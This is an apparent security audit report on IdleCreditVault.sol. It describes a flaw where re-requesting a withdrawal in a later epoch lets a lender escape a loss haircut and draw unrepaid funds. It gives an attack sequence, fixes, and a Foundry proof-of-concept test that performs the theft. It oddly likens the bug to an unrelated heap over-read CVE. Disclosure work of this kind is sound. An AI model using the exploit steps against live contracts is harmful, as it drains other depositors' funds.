### Title
Stale-epoch withdrawal request escapes stopEpoch loss haircut by re-requesting in a later epoch - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault._claimLossAdjustedWithdrawRequest` locates a user's loss-adjusted receipt solely via `lastWithdrawRequest[_user]` and reads `lossRecoveryPriceByEpoch[lossEpoch]`. When a borrower repays only the haircut amount at `stopEpochWithDuration(_lossAmount)`, a user can overwrite `lastWithdrawRequest` by calling `requestWithdraw` again in the following epoch. The loss-epoch slice of `withdrawsRequestsByEpoch` is then never routed through the loss-adjusted path and is instead paid at par by `_claimFundedWithdrawRequest`, which sums the aggregate `withdrawsRequests[_user]` across all epochs. The user receives un-haircut funds the borrower never repaid, draining the strategy's funded reserve.

### Finding Description
The external report is a heap over-read: a parser reads data past the boundary of the buffer it should consume. The credit-vault analog is an epoch over-read: receipt accounting is partitioned per epoch (`withdrawsRequestsByEpoch`, `lossRecoveryPriceByEpoch`), but the claim path reads a claim under the *latest* request epoch rather than the epoch in which each receipt was created.

Relevant code:

- `requestWithdraw` unconditionally overwrites the epoch marker and only adds to the per-epoch bucket (`IdleCreditVault.sol:282-293`):
  ```solidity
  lastWithdrawRequest[_user] = currentEpoch;
  ...
  withdrawsRequests[_user] += _amount;
  withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
  ```
  There is no guard preventing a new request while an older (loss-tagged) receipt is still unclaimed. The comment at line 323-324 explicitly blesses this flow ("if a user does not claim a withdraw request and instead requests another withdraw, he will have to wait for another epoch to claim both requests").

- `_claimLossAdjustedWithdrawRequest` (lines 789-801) keys the haircut lookup on `lastWithdrawRequest[_user]` only:
  ```solidity
  uint256 lossEpoch = lastWithdrawRequest[_user];
  uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
  if (lossRecoveryPrice == 0) return amount;
  ```
  If `lastWithdrawRequest` has been overwritten to a later, non-loss epoch, `lossRecoveryPriceByEpoch[laterEpoch] == 0` and the loss-epoch basis is never haircut.

- `_claimFundedWithdrawRequest` (lines 338-349) then pays the *aggregate* `withdrawsRequests[_user]` — which still includes the loss-epoch slice `withdrawsRequestsByEpoch[_user][lossEpoch]` — at full par via `_transferFundedClaim`.

- At the loss epoch's `stopEpochWithDuration`, the borrower was only required to fund the loss-adjusted total (the code comment at line 797 states "`pendingWithdraws` was already cleared when the borrower funded the loss-adjusted amount", and `previewLossAdjustedWithdrawFunds` computes the reduced funding). The haircut portion of the unclaimed receipt is therefore permanently unfunded.

Attack sequence (attacker = ordinary KYC'd tranche holder):
1. Epoch N running: attacker calls `requestWithdraw(X)` → `withdrawsRequestsByEpoch[attacker][N] = X`, `lastWithdrawRequest[attacker] = N`.
2. Manager calls `stopEpochWithDuration(..., _lossAmount)`; `lossRecoveryPriceByEpoch[N] = p < 1`; borrower repays only `X*p` (plus other items).
3. Buffer of epoch N+1: instead of claiming `X*p`, attacker calls `requestWithdraw(Y)` → `lastWithdrawRequest[attacker] = N+1`, `withdrawsRequestsByEpoch[attacker][N+1] = Y`.
4. Epoch N+1 stops normally; borrower funds `Y` (the still-pending `X` is not re-added to `pendingWithdraws`, so `X` is never re-funded).
5. Attacker calls `claimWithdrawRequest`: the loss path returns early (`lossRecoveryPriceByEpoch[N+1] == 0`), and `_claimFundedWithdrawRequest` pays `X + Y` at par, burning `X + Y` receipt tokens.

The `_transferFundedClaim` reserve guard (lines 899-905) only protects `defaultRecoveryReserve`, not ordinary funded claims, so it does not stop this.

### Impact Explanation
The attacker receives `X` instead of the funded `X*p` — a direct overpayment of `X*(1-p)` underlying tokens that were never repaid by the borrower. This is a loss-waterfall break: a loss socialized via `lossRecoveryPriceByEpoch` is silently reverted to par for any user who sandwiches a second request before claiming. The overpayment comes from strategy-held underlyings that back other pending receipts and active LPs, causing insolvency of exactly `X*(1-p)` that materializes for the last claimants or at the next `stopEpoch` funding shortfall. With e.g. `X = 1,000,000 USDC` and `p = 0.5`, the attacker steals ~500,000 USDC of other users' funds.

### Likelihood Explanation
- Attacker requirement: any wallet allowed to hold tranche tokens and call `requestWithdraw` — an unprivileged KYC-passing lender. No privileged role is needed; the only privileged actions (manager `startEpoch`/`stopEpochWithDuration`, borrower repayment) are honest and in-scope.
- Trigger condition: any epoch ending in a loss via `stopEpochWithDuration(_lossAmount > 0)` — a normal, expected protocol flow for impaired loans — followed by one more normal epoch. The attacker merely must hold a withdraw receipt in the loss epoch and make one additional request.
- No existing guard blocks it: the timing check `epochNumber <= lastWithdrawRequest` passes once the later epoch ends, `_clearWithdrawClaimForEpoch` is never invoked for the loss epoch, and the reserve guard in `_transferFundedClaim` only isolates `defaultRecoveryReserve`.
- Cost to attacker is one extra `requestWithdraw` transaction and one epoch of delay on their own funds.

Likelihood is medium-high conditioned on a loss event; the protocol explicitly handles partial losses, so the precondition is realistic rather than exceptional.

### Recommendation
Track loss-adjusted receipts per epoch rather than by the single `lastWithdrawRequest` marker:

- Iterate or store all epochs with `lossRecoveryPriceByEpoch[epoch] != 0` for which `withdrawsRequestsByEpoch[_user][epoch] != 0` when claiming, instead of trusting `lastWithdrawRequest[_user]`. A per-user enumerable set of pending request epochs (or a `firstUnclaimedEpoch` pointer advanced on claim) prevents a newer request from masking an older loss-epoch receipt.
- Alternatively, settle any pre-existing loss-tagged receipt inside `requestWithdraw` before overwriting `lastWithdrawRequest` (force-claim the haircut amount at request time).
- As defense-in-depth, exclude amounts belonging to epochs with a nonzero `lossRecoveryPriceByEpoch` from the par payout in `_claimFundedWithdrawRequest`, so an unclaimed loss receipt can never be paid at par even if the epoch marker is stale.

### Proof of Concept
Foundry fork-style PoC (against `IdleCreditVault` / `IdleCDOEpochVariant`, same harness shape as `test/foundry/IdleCreditVault.t.sol`):

```solidity
function testLossEpochReceiptEscapesHaircut() external {
    // Setup: user deposits and holds tranche tokens; epoch N is running.
    uint256 amount = 1_000_000 * ONE_SCALE;
    idleCDO.depositAA(amount);
    uint256 tranches = IERC20(AAtranche).balanceOf(address(this));
    _startEpochAndCheckPrices(0);

    // 1. Request withdrawal of X during epoch N.
    uint256 lossEpoch = strategy.epochNumber() + 1;
    cdoEpoch.requestWithdraw(tranches / 2, address(AAtranche)); // X
    uint256 X = strategy.withdrawsRequests(address(this));

    // 2. Manager stops epoch N with a 50% loss; borrower funds only X*p + interest.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pending = strategy.pendingWithdraws();
    uint256 active = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
    uint256 lossAmount = (active + pending) / 2; // p ~= 0.5
    (uint256 pendingToFund, ) = strategy.previewLossAdjustedWithdrawFunds(lossAmount);
    uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
    deal(defaultUnderlying, borrower, repay);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), repay);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(apr, 0, duration, lossAmount);
    assertGt(strategy.lossRecoveryPriceByEpoch(lossEpoch), 0);

    // 3. Instead of claiming, attacker requests again in epoch N+1.
    vm.prank(manager);
    cdoEpoch.startEpoch();
    cdoEpoch.requestWithdraw(tranches / 4, address(AAtranche)); // Y
    assertEq(strategy.lastWithdrawRequest(address(this)), lossEpoch + 1);

    // 4. Epoch N+1 stops normally; borrower funds only Y.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 repay2 = cdoEpoch.expectedEpochInterest() + strategy.pendingWithdraws();
    deal(defaultUnderlying, borrower, repay2);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), repay2);
    vm.prank(manager);
    cdoEpoch.stopEpoch(apr2, 0);

    // 5. Attacker claims X + Y at par: loss path skipped because
    //    lossRecoveryPriceByEpoch[N+1] == 0, funded path pays aggregate.
    uint256 balBefore = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 got = underlying.balanceOf(address(this)) - balBefore;

    uint256 haircutExpected = X * strategy.lossRecoveryPriceByEpoch(lossEpoch) / RECOVERY_FULL;
    // BUG: got == X + Y (par) instead of haircutExpected + Y
    assertGt(got, haircutExpected + strategy.withdrawsRequestsByEpoch(address(this), lossEpoch + 1));
}
```

The assertion demonstrates the stolen amount `X * (1 - lossRecoveryPrice)` paid out of strategy underlyings that were funded for other claimants — a concrete insolvency reproducing the epoch-boundary over-read analog of CVE-2017-9207.
